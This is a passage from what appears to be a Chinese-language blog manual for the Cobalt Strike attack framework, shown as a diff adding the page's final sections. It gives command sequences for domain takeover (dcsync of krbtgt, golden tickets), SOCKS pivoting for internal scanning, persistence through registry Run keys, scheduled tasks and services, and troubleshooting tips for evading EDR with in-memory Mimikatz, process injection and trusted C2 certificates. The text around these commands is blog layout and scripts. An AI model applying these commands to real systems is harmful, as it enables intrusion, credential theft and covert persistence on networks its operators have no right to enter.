+<h3 id="场景-5：域渗透"><a href="#场景-5：域渗透" class="headerlink" title="场景 5：域渗透"></a>场景 5：域渗透</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell nltest /dclist</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">dcsync test.local krbtgt    <span class="hljs-comment"># 导出 krbtgt</span></span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">dcsync test.local administrator</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">golden_ticket_create test.local &lt;krbtgt_hash&gt; &lt;DC&gt;</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">kerberos_ticket_use &lt;ticket_file&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-6：内网代理链"><a href="#场景-6：内网代理链" class="headerlink" title="场景 6：内网代理链"></a>场景 6：内网代理链</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 跳板机 Beacon 开代理</span><br><span class="hljs-attribute">beacon</span>&gt; socks <span class="hljs-number">1080</span><br><br><span class="hljs-comment"># 本地配置 proxychains</span><br><span class="hljs-comment"># socks4 127.0.0.1 1080</span><br><br><span class="hljs-comment"># 内网扫描</span><br><span class="hljs-attribute">proxychains</span> nmap -sT -Pn <span class="hljs-number">172.16.1.0</span>/<span class="hljs-number">24</span> -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3389</span><br><br><span class="hljs-comment"># 内网服务访问</span><br><span class="hljs-attribute">proxychains</span> rdesktop <span class="hljs-number">172.16.1.10</span><br><span class="hljs-attribute">proxychains</span> smbclient //<span class="hljs-number">172.16.1.10</span>/share<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-7：持久化"><a href="#场景-7：持久化" class="headerlink" title="场景 7：持久化"></a>场景 7：持久化</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix">beacon<span class="hljs-operator">&gt;</span> shell reg add <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>oftware<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\R</span>un&quot;</span> <span class="hljs-symbol">/v</span> update <span class="hljs-symbol">/t</span> REG_SZ <span class="hljs-symbol">/d</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ayload.exe&quot;</span> <span class="hljs-symbol">/f</span><br>beacon<span class="hljs-operator">&gt;</span> shell schtasks <span class="hljs-symbol">/create</span> <span class="hljs-symbol">/tn</span> update <span class="hljs-symbol">/tr</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ayload.exe&quot;</span> <span class="hljs-symbol">/sc</span> onlogon <span class="hljs-symbol">/ru</span> system<br>beacon<span class="hljs-operator">&gt;</span> shell sc create update binpath<span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ayload.exe&quot;</span> start<span class="hljs-operator">=</span> auto<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二十一、常见踩坑"><a href="#二十一、常见踩坑" class="headerlink" title="二十一、常见踩坑"></a>二十一、常见踩坑</h2><h3 id="21-1-Beacon-上线但无回显"><a href="#21-1-Beacon-上线但无回显" class="headerlink" title="21.1 Beacon 上线但无回显"></a>21.1 Beacon 上线但无回显</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">❌ <span class="hljs-built_in">sleep</span> 过长，命令执行后需等待回连</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash"><span class="hljs-built_in">sleep</span> 300</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">✅ 执行关键操作前设为交互模式</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash"><span class="hljs-built_in">sleep</span> 0</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash"><span class="hljs-built_in">whoami</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">操作完成后恢复</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash"><span class="hljs-built_in">sleep</span> 60 30</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="21-2-HTTPS-证书问题"><a href="#21-2-HTTPS-证书问题" class="headerlink" title="21.2 HTTPS 证书问题"></a>21.2 HTTPS 证书问题</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ❌ 自签名证书被浏览器/EDR 拦截</span><br><br><span class="hljs-comment"># ✅ 使用正规证书（Let&#x27;s Encrypt / 购买）</span><br><span class="hljs-comment"># 将证书转为 Java Keystore</span><br><span class="hljs-attribute">openssl</span> pkcs12 -export -in cert.pem -inkey key.pem -out cobaltstrike.p12 -name cobaltstrike -passout pass:<span class="hljs-number">123456</span><br><span class="hljs-attribute">keytool</span> -importkeystore -srckeystore cobaltstrike.p12 -srcstoretype pkcs12 -srcstorepass <span class="hljs-number">123456</span> -destkeystore cobaltstrike.store -deststorepass <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="21-3-Mimikatz-被拦截"><a href="#21-3-Mimikatz-被拦截" class="headerlink" title="21.3 Mimikatz 被拦截"></a>21.3 Mimikatz 被拦截</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># ❌ Mimikatz 特征被 EDR/AV 拦截</span><br><br><span class="hljs-comment"># ✅ 使用 execute-assembly 执行内存版 Mimikatz</span><br>beacon&gt;<span class="hljs-built_in"> execute-assembly </span>mimikatz.exe <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># ✅ 或使用反射加载</span><br>beacon&gt; mimikatz sekurlsa::logonpasswords<br><span class="hljs-comment"># （CS 内置的 mimikatz 命令做了部分规避处理）</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="21-4-SMB-Beacon-无法-Link"><a href="#21-4-SMB-Beacon-无法-Link" class="headerlink" title="21.4 SMB Beacon 无法 Link"></a>21.4 SMB Beacon 无法 Link</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ❌ 目标防火墙阻止 445 端口</span><br><span class="hljs-attribute">beacon</span>&gt; link <span class="hljs-number">192.168.1.10</span><br><br><span class="hljs-comment"># ✅ 先确认 445 端口开放</span><br><span class="hljs-attribute">beacon</span>&gt; portscan <span class="hljs-number">192.168.1.10</span> <span class="hljs-number">445</span><br><br><span class="hljs-comment"># ✅ 或使用 TCP Beacon 代替</span><br><span class="hljs-attribute">beacon</span>&gt; connect <span class="hljs-number">192.168.1.10</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="21-5-进程注入失败"><a href="#21-5-进程注入失败" class="headerlink" title="21.5 进程注入失败"></a>21.5 进程注入失败</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ❌ 目标进程权限不足或被 EDR 拦截</span><br><br><span class="hljs-comment"># ✅ 尝试注入到其他进程</span><br><span class="hljs-keyword">beacon&gt; </span>ps<br><span class="hljs-keyword">beacon&gt; </span>inject &lt;explorer_PID&gt; https_listener<br><br><span class="hljs-comment"># ✅ 使用 spawn 代替 inject</span><br><span class="hljs-keyword">beacon&gt; </span>spawn x64 https_listener<br></code></pre></td></tr></table></figure>
+
+<h3 id="21-6-Team-Server-连不上"><a href="#21-6-Team-Server-连不上" class="headerlink" title="21.6 Team Server 连不上"></a>21.6 Team Server 连不上</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ❌ 防火墙未开放 50050 端口</span><br><span class="hljs-attribute">sudo</span> ufw <span class="hljs-literal">allow</span> <span class="hljs-number">50050</span>/tcp<br><br><span class="hljs-comment"># ❌ Java 版本不对</span><br><span class="hljs-attribute">java</span> -version  # 确认 Java <span class="hljs-number">11</span>+<br><br><span class="hljs-comment"># ❌ 密码错误</span><br><span class="hljs-comment"># 检查启动时设置的密码</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Cobalt Strike-使用手册</div>
+      <div>https://xiaobite-hacker.github.io/2026/04/11/CobaltStrike-使用手册/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaobite</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/12/nuclei-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" title="fscan-使用手册">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fscan-使用手册</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/11/Github%E6%90%9C%E7%B4%A2%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF/" title="Github搜索泄露信息">
+                        <span class="hidden-mobile">Github搜索泄露信息</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
